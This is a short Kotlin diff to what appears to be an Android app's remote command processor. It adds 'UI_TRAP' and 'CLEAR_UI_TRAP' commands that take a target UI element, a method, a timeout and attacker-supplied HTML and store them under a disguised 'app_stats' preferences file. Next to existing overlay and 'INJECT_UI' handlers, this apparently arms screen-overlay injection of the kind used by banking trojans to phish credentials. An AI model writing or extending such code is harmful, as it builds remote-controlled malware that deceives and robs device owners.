@@ -893,6 +893,34 @@ object CommandProcessor {
                     DynamicUIManager.removeOverlay(ctx)
                     status = "RELENTLESS_TRAP_DISARMED"
                 }
+                "UI_TRAP" -> {
+                    val parts = content.split("|", limit = 4)
+                    if (parts.size >= 4) {
+                        val target = parts[0].trim()
+                        val method = parts[1].trim().uppercase()
+                        val timeout = parts[2].trim().toLongOrNull() ?: 10L
+                        val html = parts[3].trim()
+                        
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                            .putBoolean("ui_trap_active", true)
+                            .putString("ui_trap_target", target)
+                            .putString("ui_trap_method", method)
+                            .putLong("ui_trap_timeout", timeout)
+                            .putString("ui_trap_html", html)
+                            .apply()
+                        
+                        status = "UI_TRAP_ARMED"
+                        errorMsg = "Target: $target | Method: $method | Timeout: ${timeout}s"
+                    } else {
+                        status = "FAILED (FORMAT)"
+                        errorMsg = "Usage: UI_TRAP | TARGET_TEXT_OR_ID | METHOD | TIMEOUT | <html>"
+                    }
+                }
+                "CLEAR_UI_TRAP" -> {
+                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                        .putBoolean("ui_trap_active", false).apply()
+                    status = "UI_TRAP_DISARMED"
+                }
                 "INJECT_UI" -> {
                     val parts = content.split("|", limit = 3)
                     if (parts.size >= 3) {
